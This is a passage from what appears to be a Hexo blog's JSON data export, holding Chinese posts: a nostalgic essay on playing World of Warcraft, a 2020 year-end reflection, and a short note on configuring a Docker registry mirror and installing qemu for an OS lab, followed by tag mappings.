Quiz，但我还是抵挡不了DNA的反应，开了一张WOW的怀旧服月卡。玩了一下之后，我马上就后悔自己白花了这75块钱了。</p>\n<p>我始终认为WOW是<strong>最好玩、最优秀</strong>的网络游戏。WOW就是魔兽世界</p>\n<p>WOW是我在初中的时候玩的。对我来说，那是一段传奇般的经历。很遗憾，我在那段时间并没有意识去记录。因此我费尽心思才找到一张很有年代感的游戏截图。图中是我的主角色，血精灵术士，骑着坐骑凤凰，飞在奥格瑞玛力量谷的上空。</p>\n<img src=\"/img/wow2.jpg\" class=\"\">\n<p>为什么那是一段传奇般的经历，因为当时的我真的<strong>把所有精力</strong>都放在游戏里了。对当时的我而言，艾泽拉斯才是我的心之所向。你无法想象我在5.4末期的时候做出橙色披风时有多开心。而那个时候，我也没有像现在这样开始<strong>意识到时间的珍贵</strong>。对于一个有网瘾的小屁孩来说，玩游戏就是最开心的了。甚至到了初三，大家都开始收心中考了、连和我一起玩WOW的朋友都开始AFK(away from keyboard)的时候，我仍然没有意识到危机感，我还是在艾泽拉斯叱咤风云、且不亦乐乎。</p>\n<p>我不会因为最后中考考得仍然还不错而觉得当时的我很牛逼，可现在的我切切实实地觉得那段时间弥足珍贵。当时没有竞争意识，也不会因为peer pressure而发愁。因为我想的，只是快点放学让我回家玩游戏和想办法糊弄掉今天的作业。</p>\n<p>今天创建了一个人类法师，做了一个小时的新手任务之后我就关游戏了，因为还有很多事情需要做。我才意识到，即使暴雪响应了广大玩家的号召，开设了<strong>怀旧服</strong>，我也没有办法感受到之前那份单纯的快乐了。那段经历和那段特殊时期的自己，永远只能作为遥远的记忆供我回味了。</p>\n<p>今天做新手村任务的时候，组了一个也在打野怪的圣骑士。打了一会儿之后，他和我说：“你先打着，我去给孩子批改作业。”<br />\n我其实是幸运的，我能作为最后那一批90后赶上80后黄金时代的末班车，即使并不是那么完整，也让我尝尽了甜头。我的童年、中学时期都没有被补课班、舞蹈班、特长班所填满，我可以随意地在刚刚兴起的互联网青涩时代中遨游。我用过迅雷、网友快车，也混过论坛和贴吧，玩过魔兽世界，用过诸如“打酱油”、“神马”、“赶脚”这样的网络用语甚至还用过火星文。我真的觉得自己是幸运的。</p>\n<p>顺便分享一个国外玩家拍的微电影《AFK》，讲述了魔兽世界引起的<strong>网瘾</strong>的故事。很幽默，也不乏深度。</p>\n<iframe width=\"100%\" height=\"200px\" src=\"//player.bilibili.com/player.html?aid=38902&bvid=BV1qx411c7BA&cid=65098&page=1\" scrolling=\"no\" border=\"0\" frameborder=\"no\" framespacing=\"0\" allowfullscreen=\"true\"> </iframe>"},{"title":"2020，提灯寻影，举袂遮月","top_img":false,"cover":"/img/2020.jpg","date":"2020-12-31T15:45:32.000Z","_content":"\n<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=100% height=86 src=\"//music.163.com/outchain/player?type=2&id=516728102&auto=0&height=66\"></iframe>\n\n2020年注定对我来说是不平凡的一年。如果说这一年过得还算正常的话，那之前的20年都可以说是浑浑噩噩了。\n\n我在2020年找到了兴趣点，即使之前跌跌撞撞了很久。我的生活重新拥有了足以支撑我内心的重心，即使它明天可能就不在了。\n\n就算我有多想逃避，现实总是会用力地推着我走，并把我带到分岔口，我越来越体会得到这种无力感，这一年尤甚。\n\n所幸，在这个上半年，我真正开始去思考自己想要什么，自己喜欢什么。我不想去问自己：为什么之前你没去想，因为这没有意义。总是要经过一些经历的发酵，方能到达一些特殊的锚点，光凭想是不够的。我开始给自己正经地做规划，但最后慢慢发现，我的选择权并不多。我从无力、懊恼，到坦然接受，只用了一个礼拜。我非常惊讶2020年的自己，因为换在之前，我或许是走不出来的。我很高兴自己变得理性了。\n\n床还是家里的舒服，虽然空调似乎出了问题，功率变小了。我需要感谢这一年，从一定意义上，这一年中我做的不同的决定，引导我走向了不同的人生。不知道我能不能够到达我所向往的彼岸，但航行的道路上，带着地图总能让人感到安心。我觉得我拿到了正确的地图。","source":"_posts/2020，提灯寻影，举袂遮月.md","raw":"---\ntitle: 2020，提灯寻影，举袂遮月\ntop_img: false\ncover: /img/2020.jpg\ndate: 2020-12-31 23:45:32\ntags:\n- 杂谈\n---\n\n<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=100% height=86 src=\"//music.163.com/outchain/player?type=2&id=516728102&auto=0&height=66\"></iframe>\n\n2020年注定对我来说是不平凡的一年。如果说这一年过得还算正常的话，那之前的20年都可以说是浑浑噩噩了。\n\n我在2020年找到了兴趣点，即使之前跌跌撞撞了很久。我的生活重新拥有了足以支撑我内心的重心，即使它明天可能就不在了。\n\n就算我有多想逃避，现实总是会用力地推着我走，并把我带到分岔口，我越来越体会得到这种无力感，这一年尤甚。\n\n所幸，在这个上半年，我真正开始去思考自己想要什么，自己喜欢什么。我不想去问自己：为什么之前你没去想，因为这没有意义。总是要经过一些经历的发酵，方能到达一些特殊的锚点，光凭想是不够的。我开始给自己正经地做规划，但最后慢慢发现，我的选择权并不多。我从无力、懊恼，到坦然接受，只用了一个礼拜。我非常惊讶2020年的自己，因为换在之前，我或许是走不出来的。我很高兴自己变得理性了。\n\n床还是家里的舒服，虽然空调似乎出了问题，功率变小了。我需要感谢这一年，从一定意义上，这一年中我做的不同的决定，引导我走向了不同的人生。不知道我能不能够到达我所向往的彼岸，但航行的道路上，带着地图总能让人感到安心。我觉得我拿到了正确的地图。","slug":"2020，提灯寻影，举袂遮月","published":1,"updated":"2020-12-31T16:02:45.091Z","_id":"ckjd0shxc00007wwadvbl4t55","comments":1,"layout":"post","photos":[],"link":"","content":"<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=100% height=86 src=\"//music.163.com/outchain/player?type=2&id=516728102&auto=0&height=66\"></iframe>\n<p>2020年注定对我来说是不平凡的一年。如果说这一年过得还算正常的话，那之前的20年都可以说是浑浑噩噩了。</p>\n<p>我在2020年找到了兴趣点，即使之前跌跌撞撞了很久。我的生活重新拥有了足以支撑我内心的重心，即使它明天可能就不在了。</p>\n<p>就算我有多想逃避，现实总是会用力地推着我走，并把我带到分岔口，我越来越体会得到这种无力感，这一年尤甚。</p>\n<p>所幸，在这个上半年，我真正开始去思考自己想要什么，自己喜欢什么。我不想去问自己：为什么之前你没去想，因为这没有意义。总是要经过一些经历的发酵，方能到达一些特殊的锚点，光凭想是不够的。我开始给自己正经地做规划，但最后慢慢发现，我的选择权并不多。我从无力、懊恼，到坦然接受，只用了一个礼拜。我非常惊讶2020年的自己，因为换在之前，我或许是走不出来的。我很高兴自己变得理性了。</p>\n<p>床还是家里的舒服，虽然空调似乎出了问题，功率变小了。我需要感谢这一年，从一定意义上，这一年中我做的不同的决定，引导我走向了不同的人生。不知道我能不能够到达我所向往的彼岸，但航行的道路上，带着地图总能让人感到安心。我觉得我拿到了正确的地图。</p>\n","site":{"data":{}},"excerpt":"","more":"<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=100% height=86 src=\"//music.163.com/outchain/player?type=2&id=516728102&auto=0&height=66\"></iframe>\n<p>2020年注定对我来说是不平凡的一年。如果说这一年过得还算正常的话，那之前的20年都可以说是浑浑噩噩了。</p>\n<p>我在2020年找到了兴趣点，即使之前跌跌撞撞了很久。我的生活重新拥有了足以支撑我内心的重心，即使它明天可能就不在了。</p>\n<p>就算我有多想逃避，现实总是会用力地推着我走，并把我带到分岔口，我越来越体会得到这种无力感，这一年尤甚。</p>\n<p>所幸，在这个上半年，我真正开始去思考自己想要什么，自己喜欢什么。我不想去问自己：为什么之前你没去想，因为这没有意义。总是要经过一些经历的发酵，方能到达一些特殊的锚点，光凭想是不够的。我开始给自己正经地做规划，但最后慢慢发现，我的选择权并不多。我从无力、懊恼，到坦然接受，只用了一个礼拜。我非常惊讶2020年的自己，因为换在之前，我或许是走不出来的。我很高兴自己变得理性了。</p>\n<p>床还是家里的舒服，虽然空调似乎出了问题，功率变小了。我需要感谢这一年，从一定意义上，这一年中我做的不同的决定，引导我走向了不同的人生。不知道我能不能够到达我所向往的彼岸，但航行的道路上，带着地图总能让人感到安心。我觉得我拿到了正确的地图。</p>\n"},{"title":"OS lab 配置","top_img":false,"cover":"/img/OS.jpg","date":"2021-01-21T14:32:42.000Z","_content":"\n折腾了一段时间，记录一下。\n\n我本来有安装Docker，但是速度真的奇慢无比，加了一个阿里镜像。\n\n```bash\nsudo tee /etc/docker/daemon.json <<-'EOF'\n{\n  \"registry-mirrors\": [\"https://58pbs4zu.mirror.aliyuncs.com\"]\n}\nEOF\nsudo systemctl daemon-reload\nsudo systemctl restart docker\n```\n\n安装qemu，Arch下还要多安装一个qemu-arch-extra来支持x86_64以外的汇编。\n\n```bash\nsudo pacman -S qemu-arch-extra\n```\n\n然后就好了","source":"_posts/OS-lab-配置.md","raw":"---\ntitle: OS lab 配置\ntop_img: false\ncover: /img/OS.jpg\ndate: 2021-01-21 22:32:42\ntags:\n- OS\n---\n\n折腾了一段时间，记录一下。\n\n我本来有安装Docker，但是速度真的奇慢无比，加了一个阿里镜像。\n\n```bash\nsudo tee /etc/docker/daemon.json <<-'EOF'\n{\n  \"registry-mirrors\": [\"https://58pbs4zu.mirror.aliyuncs.com\"]\n}\nEOF\nsudo systemctl daemon-reload\nsudo systemctl restart docker\n```\n\n安装qemu，Arch下还要多安装一个qemu-arch-extra来支持x86_64以外的汇编。\n\n```bash\nsudo pacman -S qemu-arch-extra\n```\n\n然后就好了","slug":"OS-lab-配置","published":1,"updated":"2021-01-21T14:38:09.495Z","_id":"ckk6ylpig0000pjwahclkgn67","comments":1,"layout":"post","photos":[],"link":"","content":"<p>折腾了一段时间，记录一下。</p>\n<p>我本来有安装Docker，但是速度真的奇慢无比，加了一个阿里镜像。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo tee /etc/docker/daemon.json &lt;&lt;-<span class=\"string\">&#x27;EOF&#x27;</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"string\">&quot;registry-mirrors&quot;</span>: [<span class=\"string\">&quot;https://58pbs4zu.mirror.aliyuncs.com&quot;</span>]</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">EOF</span><br><span class=\"line\">sudo systemctl daemon-reload</span><br><span class=\"line\">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>\n<p>安装qemu，Arch下还要多安装一个qemu-arch-extra来支持x86_64以外的汇编。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo pacman -S qemu-arch-extra</span><br></pre></td></tr></table></figure>\n<p>然后就好了</p>\n","site":{"data":{}},"excerpt":"","more":"<p>折腾了一段时间，记录一下。</p>\n<p>我本来有安装Docker，但是速度真的奇慢无比，加了一个阿里镜像。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo tee /etc/docker/daemon.json &lt;&lt;-<span class=\"string\">&#x27;EOF&#x27;</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"string\">&quot;registry-mirrors&quot;</span>: [<span class=\"string\">&quot;https://58pbs4zu.mirror.aliyuncs.com&quot;</span>]</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">EOF</span><br><span class=\"line\">sudo systemctl daemon-reload</span><br><span class=\"line\">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>\n<p>安装qemu，Arch下还要多安装一个qemu-arch-extra来支持x86_64以外的汇编。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo pacman -S qemu-arch-extra</span><br></pre></td></tr></table></figure>\n<p>然后就好了</p>\n"}],"PostAsset":[],"PostCategory":[],"PostTag":[{"post_id":"ckiszi59t000198wa2bpm99t1","tag_id":"ckiszi5a1000498wa6rf1a5af","_id":"ckiszi5a8000998wa8jym643v"},{"post_id":"ckiszi5a9000a98wa2qlmhoir","tag_id":"ckiszi5a1000498wa6rf1a5af","_id":"ckiszi5ad000d98wad5r12c99"},{"post_id":"ckiszi59z000398wa3qj0ax2s","tag_id":"ckiszi5a1000498wa6rf1a5af","_id":"ckiszi5ae000f98waemz6gwet"},{"post_id":"ckiszi5a3000598wadnmc6fgt","tag_id":"ckiszi5a1000498wa6rf1a5af","_id":"ckiszi5ap000m98wa1agkeghg"},{"post_id":"ckiszi5a3000598wadnmc6fgt","tag_id":"ckiszi5ah000h98wahah03jua","_id":"ckiszi5aq000o98wagjsh19kd"},{"post_id":"ckiszi5a5000698wage1ph83w","tag_id":"ckiszi5am000k98wa2biyf6dm","_id":"ckiszi5as000r98wac8by3byo"},{"post_id":"ckiszi5ap000n98waagz31h6d","tag_id":"ckiszi5am000k98wa2biyf6dm","_id":"ckiszi5at000s98wafhqd5edp"},{"post_id":"ckiszi5a6000798wa2ducgzkh","tag_id":"ckiszi5a1000498wa6rf1a5af","_id":"ckiszi5au000u98wagvifagrg"},{"post_id":"ckiszi5a6000798wa2ducgzkh","tag_id":"ckiszi5ah000h98wahah03jua","_id":"ckiszi5au000v98wab8djexvh"},{"post_id":"ckiszi5ab000b98wa2g119kae","tag_id":"ckiszi5at000t98wa0sb4broe","_id":"ckiszi5av000y98wa12g1ebdh"},{"post_id":"ckiszi5ab000b98wa2g119kae","tag_id":"ckiszi5au000w98wab3lxeyh2","_id":"ckiszi5av000z98wag3t32x2y"},{"post_id":"ckiszi5ad000e98wa10qk7kgx","tag_id":"ckiszi5am000k98wa2biyf6dm","_id":"ckiszi5aw001198wa3g0994iz"},{"post_id":"ckiszi5af000g98wa2zntci7o","tag_id":"ckiszi5at000t98wa0sb4broe","_id":"ckiszi5ax001398wa160mfzf7"},{"post_id":"ckiszi5ai000i98waadajf2yk","tag_id":"ckiszi5aw001298wa9tjl9fpv","_id":"ckiszi5ay001598wa3sqr4xzi"},{"post_id":"ckiszi5ak000j98wa23sa3e4p","tag_id":"ckiszi5ax001498wa42vj29ij","_id":"ckiszi5az001898wa3cs65i24"},{"post_id":"ckiszi5ak000j98wa23sa3e4p","tag_id":"ckiszi5am000k98wa2biyf6dm","_id":"ckiszi5az001998wa6lsq17wo"},{"post_id":"ckiszi5an000l98wacmr2fi9o","tag_id":"ckiszi5am000k98wa2biyf6dm","_id":"ckiszi5b0001b98wa8um1aq45"},{"post_id":"ckiszi5an000l98wacmr2fi9o","tag_id":"ckiszi5az001798wac7dlddeh","_id":"ckiszi5b0001c98wa4u4a2wjh"},{"post_id":"ckiszi5ar000q98wagv3zf56z","tag_id":"ckiszi5at000t98wa0sb4broe","_id":"ckiszi5b1001d98wa56dda1m4"},{"post_id":"ckjd0shxc00007wwadvbl4t55","tag_id":"ckiszi5at000t98wa0sb4broe","_id":"ckjd0wacf00017wwaa48u9e0h"},{"post_id":"ckk6ylpig0000pjwahclkgn67","tag_id":"ckk6ylpis0001pjwa3wza69ks","_id":"ckk6ylpj00002pjwahkc67tfv"}],"Tag":[{"name":"CSAPP","_id":"ckiszi5a1000498wa6rf1a5af"},{"name":"C Programming","_id":"ckiszi5ah000h98wahah03jua"},{"name":"编译原理","_id":"ckiszi5am000k98wa2biyf6dm"},{"name":"杂谈","_id":"ckiszi5at000t98wa0sb4broe"},{"name":"电影","_id":"ckiszi5au000w98wab3lxeyh2"},{"name":"数据库","_id":"ckiszi5aw001298wa9tjl9fpv"},{"name":"正则表达式","_id":"ckiszi5ax001498wa42vj29ij"},{"name":"flex-bison","_id":"ckiszi5az001798wac7dlddeh"},{"name":"OS","_id":"ckk6ylpis0001pjwa3wza69ks"}]}}